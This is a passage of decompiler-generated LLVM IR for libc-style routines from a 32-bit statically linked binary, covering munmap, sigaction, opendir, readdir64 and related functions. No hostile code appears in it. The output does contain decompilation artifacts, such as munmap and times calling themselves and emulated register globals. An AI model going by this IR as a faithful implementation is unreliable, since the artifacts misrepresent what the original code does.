dec_label_pc_804b62b.dec_label_pc_804b637_crit_edge: ; preds = %dec_label_pc_804b62b
  %v0_804b639.pre = load i32, i32* @global_var_80557d0.88, align 16
  br label %dec_label_pc_804b637

dec_label_pc_804b637:                             ; preds = %dec_label_pc_804b62b.dec_label_pc_804b637_crit_edge, %entry
  %v0_804b639 = phi i32 [ %v0_804b639.pre, %dec_label_pc_804b62b.dec_label_pc_804b637_crit_edge ], [ %v0_804b622, %entry ]
  %v1_804b637 = icmp eq i32 %arg1, 0
  %v1_804b63e = icmp eq i1 %v1_804b637, false
  store i32 %v0_804b639, i32* @ebx, align 4
  br i1 %v1_804b63e, label %dec_label_pc_804b644, label %dec_label_pc_804b657

dec_label_pc_804b644:                             ; preds = %dec_label_pc_804b637
  %v2_804b646 = add i32 %v0_804b639, %arg1
  %v1_804b64a = inttoptr i32 %v2_804b646 to i32*
  %v2_804b64a = call i32 @__GI_brk(i32* %v1_804b64a)
  %v2_804b650 = icmp slt i32 %v2_804b64a, 0
  %v1_804b652 = icmp eq i1 %v2_804b650, false
  br i1 %v1_804b652, label %dec_label_pc_804b644.dec_label_pc_804b657_crit_edge, label %dec_label_pc_804b654

dec_label_pc_804b644.dec_label_pc_804b657_crit_edge: ; preds = %dec_label_pc_804b644
  %v0_804b657.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b657

dec_label_pc_804b654:                             ; preds = %dec_label_pc_804b644, %dec_label_pc_804b62b
  br label %dec_label_pc_804b657

dec_label_pc_804b657:                             ; preds = %dec_label_pc_804b644.dec_label_pc_804b657_crit_edge, %dec_label_pc_804b637, %dec_label_pc_804b654
  %v0_804b657 = phi i32 [ %v0_804b657.pre, %dec_label_pc_804b644.dec_label_pc_804b657_crit_edge ], [ %v0_804b639, %dec_label_pc_804b637 ], [ -1, %dec_label_pc_804b654 ]
  %v2_804b659 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b659, i32* @ebx, align 4
  ret i32 %v0_804b657

; uselistorder directives
  uselistorder i32 %v0_804b639, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b657, { 2, 0, 1 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %v1_804b661 = call i32 @int80_syscall(i32 200)
  ret i32 %v1_804b661
}

define i32 @getdtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v15_804b664 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804b66c = call i32 @getrlimit(i32 7, i32 %v15_804b664)
  %v2_804b678 = icmp slt i32 %v2_804b66c, 0
  br i1 %v2_804b678, label %dec_label_pc_804b67f, label %dec_label_pc_804b67c

dec_label_pc_804b67c:                             ; preds = %entry
  %v2_804b681.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804b67f

dec_label_pc_804b67f:                             ; preds = %entry, %dec_label_pc_804b67c
  %v0_804b67f = phi i32 [ %v2_804b681.pre, %dec_label_pc_804b67c ], [ 256, %entry ]
  ret i32 %v0_804b67f

; uselistorder directives
  uselistorder label %dec_label_pc_804b67f, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804b684 = load i32, i32* @ebx, align 4
  store i32 %v0_804b684, i32* %stack_var_-4, align 4
  %v2_804b694 = call i32 @munmap(i32 %v0_804b684, i32 %tmp3)
  store i32 %v2_804b694, i32* %ebx.global-to-local, align 4
  %tmp5 = icmp ult i32 %v2_804b694, -4095
  br i1 %tmp5, label %dec_label_pc_804b6ae, label %dec_label_pc_804b6a2

dec_label_pc_804b6a2:                             ; preds = %entry
  %v0_804b6a2 = load i32, i32* %stack_var_-4, align 4
  %v1_804b6a2 = call i32 @__GI___errno_location(i32 %v0_804b6a2)
  %v0_804b6a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b6a7 = sub i32 0, %v0_804b6a7
  store i32 %v1_804b6a7, i32* %ebx.global-to-local, align 4
  %v2_804b6a9 = inttoptr i32 %v1_804b6a2 to i32*
  store i32 %v1_804b6a7, i32* %v2_804b6a9, align 4
  br label %dec_label_pc_804b6ae

dec_label_pc_804b6ae:                             ; preds = %entry, %dec_label_pc_804b6a2
  %v0_804b6af = phi i32 [ %v2_804b694, %entry ], [ -1, %dec_label_pc_804b6a2 ]
  %v2_804b6ae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b6ae, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b6af

; uselistorder directives
  uselistorder i32 %v2_804b694, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @munmap, { 1, 0 }
  uselistorder label %dec_label_pc_804b6ae, { 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804b6bb = call i32 @times(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_804b6bb

; uselistorder directives
  uselistorder i32 (i32)* @times, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-4 = alloca i32, align 4
  %v0_804b6c0 = load i32, i32* @esi, align 4
  store i32 %v0_804b6c0, i32* %stack_var_-4, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b6d1 = load i32, i32* @ebx, align 4
  %v7_804b6d9 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp6)
  store i32 %v0_804b6d1, i32* @ebx, align 4
  store i32 %v7_804b6d9, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804b6d9, -4095
  br i1 %tmp11, label %dec_label_pc_804b6f2, label %dec_label_pc_804b6e6

dec_label_pc_804b6e6:                             ; preds = %entry
  %v1_804b6e6 = call i32 @__GI___errno_location(i32 %v0_804b6d1)
  %v0_804b6eb = load i32, i32* %esi.global-to-local, align 4
  %v1_804b6eb = sub i32 0, %v0_804b6eb
  store i32 %v1_804b6eb, i32* %esi.global-to-local, align 4
  %v2_804b6ed = inttoptr i32 %v1_804b6e6 to i32*
  store i32 %v1_804b6eb, i32* %v2_804b6ed, align 4
  br label %dec_label_pc_804b6f2

dec_label_pc_804b6f2:                             ; preds = %entry, %dec_label_pc_804b6e6
  %v0_804b6f3 = phi i32 [ %v7_804b6d9, %entry ], [ -1, %dec_label_pc_804b6e6 ]
  %v2_804b6f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b6f2, i32* %esi.global-to-local, align 4
  ret i32 %v0_804b6f3

; uselistorder directives
  uselistorder i32 %v7_804b6d9, { 1, 0, 2 }
  uselistorder i32 %v0_804b6d1, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f2, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-4 = alloca i32, align 4
  %v0_804b6f4 = load i32, i32* @esi, align 4
  store i32 %v0_804b6f4, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @edx, align 4
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804b706 = load i32, i32* @ebx, align 4
  %v7_804b70e = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp5)
  store i32 %v0_804b706, i32* @ebx, align 4
  store i32 %v7_804b70e, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v7_804b70e, -4095
  br i1 %tmp10, label %dec_label_pc_804b727, label %dec_label_pc_804b71b

dec_label_pc_804b71b:                             ; preds = %entry
  %v1_804b71b = call i32 @__GI___errno_location(i32 %v0_804b706)
  %v0_804b720 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b720 = sub i32 0, %v0_804b720
  store i32 %v1_804b720, i32* %esi.global-to-local, align 4
  %v2_804b722 = inttoptr i32 %v1_804b71b to i32*
  store i32 %v1_804b720, i32* %v2_804b722, align 4
  br label %dec_label_pc_804b727

dec_label_pc_804b727:                             ; preds = %entry, %dec_label_pc_804b71b
  %v0_804b728 = phi i32 [ %v7_804b70e, %entry ], [ -1, %dec_label_pc_804b71b ]
  %v2_804b727 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b727, i32* @esi, align 4
  ret i32 %v0_804b728

; uselistorder directives
  uselistorder i32 %v7_804b70e, { 1, 0, 2 }
  uselistorder i32 %v0_804b706, { 1, 0 }
  uselistorder label %dec_label_pc_804b727, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804b72d = load i32, i32* @esi, align 4
  %v0_804b72e = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* @edi, align 4
  %v2_804b736 = load i32, i32* %arg1, align 4
  %v12_804b736 = icmp eq i32 %v2_804b736, -1
  %v1_804b739 = icmp eq i1 %v12_804b736, false
  br i1 %v1_804b739, label %dec_label_pc_804b748, label %dec_label_pc_804b73b

dec_label_pc_804b73b:                             ; preds = %entry
  %v1_804b73b = call i32 @__GI___errno_location(i32 %v0_804b72e)
  %v1_804b740 = inttoptr i32 %v1_804b73b to i32*
  store i32 9, i32* %v1_804b740, align 4
  br label %dec_label_pc_804b7a2

dec_label_pc_804b748:                             ; preds = %entry
  %v12_804b72f = ptrtoint i32* %stack_var_-28 to i32
  %v1_804b748 = add i32 %tmp3, 24
  store i32 %v1_804b748, i32* %ebx.global-to-local, align 4
  store i32 %v12_804b72f, i32* @esi, align 4
  %v4_804b756 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134525440, i32 %v1_804b748)
  %v1_804b75c = call i32 @__pthread_return_0(i32 %v1_804b748)
  %v0_804b761 = load i32, i32* @edi, align 4
  %v1_804b761 = inttoptr i32 %v0_804b761 to i32*
  %v2_804b761 = load i32, i32* %v1_804b761, align 4
  store i32 %v2_804b761, i32* @ebx, align 4
  store i32 -1, i32* %v1_804b761, align 4
  %v3_804b76c = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_804b771 = load i32, i32* @edi, align 4
  %v1_804b771 = add i32 %v0_804b771, 12
  %v2_804b771 = inttoptr i32 %v1_804b771 to i32*
  %v3_804b771 = load i32, i32* %v2_804b771, align 4
  %v1_804b774 = call i32 @free(i32 %v3_804b771)
  %v0_804b779 = load i32, i32* @edi, align 4
  store i32 %v0_804b779, i32* %stack_var_-60, align 4
  %v1_804b77a = call i32 @free(i32 %v0_804b779)
  %v0_804b77f = load i32, i32* @ebx, align 4
  %v1_804b788 = call i32 @close(i32 %v0_804b77f)
  store i32 %v1_804b788, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v1_804b788, -4095
  br i1 %tmp17, label %dec_label_pc_804b7a5, label %dec_label_pc_804b799

dec_label_pc_804b799:                             ; preds = %dec_label_pc_804b748
  %v0_804b799 = load i32, i32* %stack_var_-60, align 4
  %v1_804b799 = call i32 @__GI___errno_location(i32 %v0_804b799)
  %v0_804b79e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b79e = sub i32 0, %v0_804b79e
  store i32 %v1_804b79e, i32* %ebx.global-to-local, align 4
  %v2_804b7a0 = inttoptr i32 %v1_804b799 to i32*
  store i32 %v1_804b79e, i32* %v2_804b7a0, align 4
  br label %dec_label_pc_804b7a2

dec_label_pc_804b7a2:                             ; preds = %dec_label_pc_804b73b, %dec_label_pc_804b799
  br label %dec_label_pc_804b7a5

dec_label_pc_804b7a5:                             ; preds = %dec_label_pc_804b748, %dec_label_pc_804b7a2
  %v0_804b7ab = phi i32 [ %v1_804b788, %dec_label_pc_804b748 ], [ -1, %dec_label_pc_804b7a2 ]
  store i32 %v0_804b72e, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b72d, i32* @esi, align 4
  ret i32 %v0_804b7ab

; uselistorder directives
  uselistorder i32 %v1_804b788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b7a5, { 1, 0 }
  uselistorder label %dec_label_pc_804b7a2, { 1, 0 }
}

define i32 @fd_to_DIR() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804b7ac = load i32, i32* @edi, align 4
  %v0_804b7ae = load i32, i32* @ebx, align 4
  store i32 %v0_804b7ae, i32* %stack_var_-12, align 4
  %v15_804b7af = ptrtoint i32* %stack_var_-36 to i32
  %v0_804b7b2 = load i32, i32* @eax, align 4
  store i32 %v0_804b7b2, i32* @edi, align 4
  %v0_804b7b4 = load i32, i32* @edx, align 4
  store i32 %v0_804b7b4, i32* @ebx, align 4
  %v1_804b7b8 = call i32 @malloc(i32 48)
  %v1_804b7c0 = icmp eq i32 %v1_804b7b8, 0
  br i1 %v1_804b7c0, label %dec_label_pc_804b82b, label %dec_label_pc_804b7c4

dec_label_pc_804b7c4:                             ; preds = %entry
  store i32 %v1_804b7b8, i32* @esi, align 4
  %v0_804b7c6 = load i32, i32* @edi, align 4
  %v2_804b7c6 = inttoptr i32 %v1_804b7b8 to i32*
  store i32 %v0_804b7c6, i32* %v2_804b7c6, align 4
  %v1_804b7c8 = add i32 %v1_804b7b8, 16
  %v2_804b7c8 = inttoptr i32 %v1_804b7c8 to i32*
  store i32 0, i32* %v2_804b7c8, align 4
  %v1_804b7cf = add i32 %v1_804b7b8, 8
  %v2_804b7cf = inttoptr i32 %v1_804b7cf to i32*
  store i32 0, i32* %v2_804b7cf, align 4
  %v1_804b7d6 = add i32 %v1_804b7b8, 4
  %v2_804b7d6 = inttoptr i32 %v1_804b7d6 to i32*
  store i32 0, i32* %v2_804b7d6, align 4
  %v0_804b7dd = load i32, i32* @ebx, align 4
  %v2_804b7dd = add i32 %v1_804b7b8, 20
  %v3_804b7dd = inttoptr i32 %v2_804b7dd to i32*
  store i32 %v0_804b7dd, i32* %v3_804b7dd, align 4
  %v0_804b7e0 = load i32, i32* @ebx, align 4
  %v6_804b7e6 = icmp ugt i32 %v0_804b7e0, 511
  br i1 %v6_804b7e6, label %dec_label_pc_804b7ef, label %dec_label_pc_804b7e8

dec_label_pc_804b7e8:                             ; preds = %dec_label_pc_804b7c4
  store i32 512, i32* %v3_804b7dd, align 4
  br label %dec_label_pc_804b7ef

dec_label_pc_804b7ef:                             ; preds = %dec_label_pc_804b7c4, %dec_label_pc_804b7e8
  %v0_804b7ef = load i32, i32* @esi, align 4
  %v1_804b7ef = add i32 %v0_804b7ef, 20
  %v2_804b7ef = inttoptr i32 %v1_804b7ef to i32*
  %v3_804b7ef = load i32, i32* %v2_804b7ef, align 4
  %v3_804b7f4 = call i32 @calloc(i64 1, i32 %v3_804b7ef)
  %v1_804b7f9 = load i32, i32* @esi, align 4
  %v2_804b7f9 = add i32 %v1_804b7f9, 12
  %v3_804b7f9 = inttoptr i32 %v2_804b7f9 to i32*
  store i32 %v3_804b7f4, i32* %v3_804b7f9, align 4
  %v1_804b7fe = icmp eq i32 %v3_804b7f4, 0
  %v1_804b800 = icmp eq i1 %v1_804b7fe, false
  br i1 %v1_804b800, label %dec_label_pc_804b80d, label %dec_label_pc_804b802

dec_label_pc_804b802:                             ; preds = %dec_label_pc_804b7ef
  %v0_804b802 = load i32, i32* @esi, align 4
  %v1_804b803 = call i32 @free(i32 %v0_804b802)
  br label %dec_label_pc_804b82b

dec_label_pc_804b80d:                             ; preds = %dec_label_pc_804b7ef
  %v3_804b817 = bitcast i32* %stack_var_-36 to i8*
  %v4_804b817 = call i32 @memcpy(i8* %v3_804b817, i32 ptrtoint (i32* @global_var_805127c.89 to i32), i32 24)
  %v0_804b81c = load i32, i32* @esi, align 4
  %v1_804b81c = add i32 %v0_804b81c, 24
  %v3_804b823 = inttoptr i32 %v1_804b81c to i8*
  %v4_804b823 = call i32 @memcpy(i8* %v3_804b823, i32 %v15_804b7af, i32 24)
  %v0_804b82b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b82b

dec_label_pc_804b82b:                             ; preds = %entry, %dec_label_pc_804b802, %dec_label_pc_804b80d
  %v0_804b82b = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_804b802 ], [ %v0_804b82b.pre, %dec_label_pc_804b80d ]
  %v2_804b830 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b830, i32* @ebx, align 4
  store i32 %v0_804b7ac, i32* @edi, align 4
  ret i32 %v0_804b82b

; uselistorder directives
  uselistorder i32 %v1_804b7b8, { 0, 1, 6, 2, 5, 4, 3 }
  uselistorder label %dec_label_pc_804b82b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7ef, { 1, 0 }
}

define i32 @__GI_opendir(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v0_804b835 = load i32, i32* @ebx, align 4
  %v15_804b836 = ptrtoint i32* %stack_var_-96 to i32
  %v4_804b849 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 591872)
  store i32 %v4_804b849, i32* @ebx, align 4
  %tmp9 = icmp ult i32 %v4_804b849, -4095
  br i1 %tmp9, label %dec_label_pc_804b863, label %dec_label_pc_804b856

dec_label_pc_804b856:                             ; preds = %entry
  %v1_804b856 = call i32 @__GI___errno_location(i32 %v0_804b835)
  %v0_804b85b = load i32, i32* @ebx, align 4
  %v1_804b85b = sub i32 0, %v0_804b85b
  %v2_804b85d = inttoptr i32 %v1_804b856 to i32*
  store i32 %v1_804b85b, i32* %v2_804b85d, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804b8bd

dec_label_pc_804b863:                             ; preds = %entry
  store i32 0, i32* @esi, align 4
  %v2_804b865 = icmp slt i32 %v4_804b849, 0
  br i1 %v2_804b865, label %dec_label_pc_804b8bd, label %dec_label_pc_804b869

dec_label_pc_804b869:                             ; preds = %dec_label_pc_804b863
  %v2_804b86d = call i32 @fstat(i32 %v4_804b849, i32 %v15_804b836)
  %v2_804b874 = icmp slt i32 %v2_804b86d, 0
  %v1_804b876 = icmp eq i1 %v2_804b874, false
  br i1 %v1_804b876, label %dec_label_pc_804b887, label %dec_label_pc_804b878

dec_label_pc_804b878:                             ; preds = %dec_label_pc_804b869
  %v0_804b878 = load i32, i32* @ebx, align 4
  %v1_804b881 = call i32 @close(i32 %v0_804b878)
  br label %dec_label_pc_804b8bd

dec_label_pc_804b887:                             ; preds = %dec_label_pc_804b869
  %v0_804b88b = load i32, i32* @ebx, align 4
  store i32 %v0_804b88b, i32* %stack_var_-108, align 4
  %v3_804b88c = call i32 @__GI___fcntl_nocancel(i32 %v0_804b88b, i32 2, i32 1)
  %v0_804b895 = load i32, i32* @ebx, align 4
  store i32 %v0_804b895, i32* @eax, align 4
  %v0_804b897 = call i32 @fd_to_DIR()
  store i32 %v0_804b897, i32* @esi, align 4
  %v1_804b8a1 = icmp eq i32 %v0_804b897, 0
  %v1_804b8a3 = icmp eq i1 %v1_804b8a1, false
  br i1 %v1_804b8a3, label %dec_label_pc_804b8bd, label %dec_label_pc_804b8a5

dec_label_pc_804b8a5:                             ; preds = %dec_label_pc_804b887
  %v0_804b8a5 = load i32, i32* @ebx, align 4
  %v1_804b8ae = call i32 @close(i32 %v0_804b8a5)
  %v0_804b8b2 = load i32, i32* %stack_var_-108, align 4
  %v1_804b8b2 = call i32 @__GI___errno_location(i32 %v0_804b8b2)
  %v1_804b8b7 = inttoptr i32 %v1_804b8b2 to i32*
  store i32 12, i32* %v1_804b8b7, align 4
  br label %dec_label_pc_804b8bd

dec_label_pc_804b8bd:                             ; preds = %dec_label_pc_804b887, %dec_label_pc_804b863, %dec_label_pc_804b878, %dec_label_pc_804b856, %dec_label_pc_804b8a5
  %v0_804b8bd = load i32, i32* @esi, align 4
  ret i32 %v0_804b8bd

; uselistorder directives
  uselistorder i32 %v4_804b849, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804b8bd, { 4, 0, 2, 1, 3 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-92 = alloca i32, align 4
  %v15_804b8c6 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %arg1, i32* @ebx, align 4
  %v2_804b8d1 = call i32 @fstat(i32 %arg1, i32 %v15_804b8c6)
  %v1_804b8d8 = icmp eq i32 %v2_804b8d1, 0
  %v1_804b8da = icmp eq i1 %v1_804b8d8, false
  br i1 %v1_804b8da, label %dec_label_pc_804b928, label %dec_label_pc_804b8dc

dec_label_pc_804b8dc:                             ; preds = %entry
  %v1_804b8e0 = and i32 %tmp1, 61440
  %v6_804b8e5 = icmp eq i32 %v1_804b8e0, 16384
  br i1 %v6_804b8e5, label %dec_label_pc_804b8f9, label %dec_label_pc_804b8ec

dec_label_pc_804b8ec:                             ; preds = %dec_label_pc_804b8dc
  %v1_804b8ec = call i32 @__GI___errno_location(i32 %arg1)
  %v1_804b8f1 = inttoptr i32 %v1_804b8ec to i32*
  store i32 20, i32* %v1_804b8f1, align 4
  br label %dec_label_pc_804b928

dec_label_pc_804b8f9:                             ; preds = %dec_label_pc_804b8dc
  %v0_804b8fb = load i32, i32* @ebx, align 4
  %v2_804b8fc = load i32, i32* %stack_var_-92, align 4
  %v3_804b8fc = call i32 @__libc_fcntl(i32 %v0_804b8fb, i32 3, i32 %v2_804b8fc)
  %v10_804b903 = icmp eq i32 %v3_804b8fc, -1
  br i1 %v10_804b903, label %dec_label_pc_804b928, label %dec_label_pc_804b908

dec_label_pc_804b908:                             ; preds = %dec_label_pc_804b8f9
  %v1_804b908 = urem i32 %v3_804b8fc, 4
  %v8_804b90b = icmp eq i32 %v1_804b908, 1
  %v1_804b90c = icmp eq i1 %v8_804b90b, false
  br i1 %v1_804b90c, label %dec_label_pc_804b91b, label %dec_label_pc_804b90e

dec_label_pc_804b90e:                             ; preds = %dec_label_pc_804b908
  %v1_804b90e = call i32 @__GI___errno_location(i32 %v0_804b8fb)
  %v1_804b913 = inttoptr i32 %v1_804b90e to i32*
  store i32 22, i32* %v1_804b913, align 4
  br label %dec_label_pc_804b928

dec_label_pc_804b91b:                             ; preds = %dec_label_pc_804b908
  %v0_804b91f = load i32, i32* @ebx, align 4
  store i32 %v0_804b91f, i32* @eax, align 4
  %v0_804b921 = call i32 @fd_to_DIR()
  br label %dec_label_pc_804b92a

dec_label_pc_804b928:                             ; preds = %dec_label_pc_804b8f9, %entry, %dec_label_pc_804b90e, %dec_label_pc_804b8ec
  br label %dec_label_pc_804b92a

dec_label_pc_804b92a:                             ; preds = %dec_label_pc_804b91b, %dec_label_pc_804b928
  %storemerge = phi i32 [ %v0_804b921, %dec_label_pc_804b91b ], [ 0, %dec_label_pc_804b928 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 ()* @fd_to_DIR, { 1, 0 }
  uselistorder i32 16384, { 1, 0 }
  uselistorder label %dec_label_pc_804b92a, { 1, 0 }
  uselistorder label %dec_label_pc_804b928, { 2, 0, 3, 1 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b930 = load i32, i32* @esi, align 4
  %v0_804b931 = load i32, i32* @ebx, align 4
  store i32 %v0_804b931, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v1_804b939 = add i32 %tmp2, 24
  store i32 %v1_804b939, i32* @ebx, align 4
  %v4_804b947 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134525440, i32 %v1_804b939)
  %v0_804b94c = load i32, i32* @ebx, align 4
  %v1_804b94d = call i32 @__pthread_return_0(i32 %v0_804b94c)
  br label %dec_label_pc_804b955

dec_label_pc_804b955:                             ; preds = %dec_label_pc_804b97f, %entry
  %v0_804b955 = load i32, i32* @esi, align 4
  %v1_804b955 = add i32 %v0_804b955, 8
  %v2_804b955 = inttoptr i32 %v1_804b955 to i32*
  %v3_804b955 = load i32, i32* %v2_804b955, align 4
  %v2_804b958 = add i32 %v0_804b955, 4
  %v3_804b958 = inttoptr i32 %v2_804b958 to i32*
  %v4_804b958 = load i32, i32* %v3_804b958, align 4
  %v6_804b95b = icmp ugt i32 %v3_804b955, %v4_804b958
  br i1 %v6_804b95b, label %dec_label_pc_804b97f, label %dec_label_pc_804b95d

dec_label_pc_804b95d:                             ; preds = %dec_label_pc_804b955
  %v1_804b95d = add i32 %v0_804b955, 20
  %v2_804b95d = inttoptr i32 %v1_804b95d to i32*
  %v3_804b95d = load i32, i32* %v2_804b95d, align 4
  %v1_804b960 = add i32 %v0_804b955, 12
  %v2_804b960 = inttoptr i32 %v1_804b960 to i32*
  %v3_804b960 = load i32, i32* %v2_804b960, align 4
  %v1_804b963 = inttoptr i32 %v0_804b955 to i32*
  %v2_804b963 = load i32, i32* %v1_804b963, align 4
  %v3_804b965 = inttoptr i32 %v3_804b960 to i32*
  %v4_804b965 = call i32 @__getdents64(i32 %v2_804b963, i32* %v3_804b965, i32 %v3_804b95d)
  %tmp11 = icmp slt i32 %v4_804b965, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_804b975, label %dec_label_pc_804b971

dec_label_pc_804b971:                             ; preds = %dec_label_pc_804b95d
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804b99d

dec_label_pc_804b975:                             ; preds = %dec_label_pc_804b95d
  %v1_804b975 = load i32, i32* @esi, align 4
  %v2_804b975 = add i32 %v1_804b975, 8
  %v3_804b975 = inttoptr i32 %v2_804b975 to i32*
  store i32 %v4_804b965, i32* %v3_804b975, align 4
  %v0_804b978 = load i32, i32* @esi, align 4
  %v1_804b978 = add i32 %v0_804b978, 4
  %v2_804b978 = inttoptr i32 %v1_804b978 to i32*
  store i32 0, i32* %v2_804b978, align 4
  %v0_804b97f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b97f

dec_label_pc_804b97f:                             ; preds = %dec_label_pc_804b955, %dec_label_pc_804b975
  %v1_804b98d = phi i32 [ %v0_804b955, %dec_label_pc_804b955 ], [ %v0_804b97f.pre, %dec_label_pc_804b975 ]
  %v1_804b97f = add i32 %v1_804b98d, 4
  %v2_804b97f = inttoptr i32 %v1_804b97f to i32*
  %v3_804b97f = load i32, i32* %v2_804b97f, align 4
  %v2_804b984 = add i32 %v1_804b98d, 12
  %v3_804b984 = inttoptr i32 %v2_804b984 to i32*
  %v4_804b984 = load i32, i32* %v3_804b984, align 4
  %v5_804b984 = add i32 %v4_804b984, %v3_804b97f
  store i32 %v5_804b984, i32* @ebx, align 4
  %v1_804b987 = add i32 %v5_804b984, 16
  %v2_804b987 = inttoptr i32 %v1_804b987 to i16*
  %v3_804b987 = load i16, i16* %v2_804b987, align 2
  %v4_804b987 = zext i16 %v3_804b987 to i32
  %v2_804b98b = add i32 %v4_804b987, %v3_804b97f
  store i32 %v2_804b98b, i32* %v2_804b97f, align 4
  %v0_804b990 = load i32, i32* @ebx, align 4
  %v1_804b990 = add i32 %v0_804b990, 8
  %v2_804b990 = inttoptr i32 %v1_804b990 to i32*
  %v3_804b990 = load i32, i32* %v2_804b990, align 4
  %v1_804b993 = load i32, i32* @esi, align 4
  %v2_804b993 = add i32 %v1_804b993, 16
  %v3_804b993 = inttoptr i32 %v2_804b993 to i32*
  store i32 %v3_804b990, i32* %v3_804b993, align 4
  %v0_804b996 = load i32, i32* @ebx, align 4
  %v1_804b996 = inttoptr i32 %v0_804b996 to i32*
  %v2_804b996 = load i32, i32* %v1_804b996, align 4
  %v2_804b998 = add i32 %v0_804b996, 4
  %v3_804b998 = inttoptr i32 %v2_804b998 to i32*
  %v4_804b998 = load i32, i32* %v3_804b998, align 4
  %v5_804b998 = or i32 %v4_804b998, %v2_804b996
  %v6_804b998 = icmp eq i32 %v5_804b998, 0
  br i1 %v6_804b998, label %dec_label_pc_804b955, label %dec_label_pc_804b99d

dec_label_pc_804b99d:                             ; preds = %dec_label_pc_804b97f, %dec_label_pc_804b971
  %v3_804b9a4 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_804b9a9 = load i32, i32* @ebx, align 4
  %v2_804b9ae = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b9ae, i32* @ebx, align 4
  store i32 %v0_804b930, i32* @esi, align 4
  ret i32 %v0_804b9a9

; uselistorder directives
  uselistorder i32 %v1_804b98d, { 1, 0 }
  uselistorder i32 %v4_804b965, { 1, 0 }
  uselistorder i32 %v0_804b955, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp2, { 1, 0 }
  uselistorder label %dec_label_pc_804b97f, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80537c4.90 to i32)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
